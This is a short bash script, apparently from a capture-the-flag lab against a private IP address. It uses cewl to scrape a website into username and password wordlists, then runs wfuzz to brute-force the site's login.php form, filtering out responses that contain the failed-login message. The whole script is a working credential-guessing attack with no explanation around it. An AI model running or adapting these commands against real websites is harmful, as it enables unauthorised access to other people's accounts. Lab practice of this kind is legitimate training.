#!/bin/bash

export IP="10.10.157.231"

cewl -d 2 -m 5 -w passwords.txt http://$IP --with-numbers
cewl -d 0 -m 5 -w usernames.txt http://$IP/team.php --lowercase

wfuzz -c -z file,usernames.txt -z file,passwords.txt --hs "Please enter the correct credentials" -u http://$IP/login.php -d "username=FUZZ&password=FUZ2Z" | tee "fuzzer.logs"


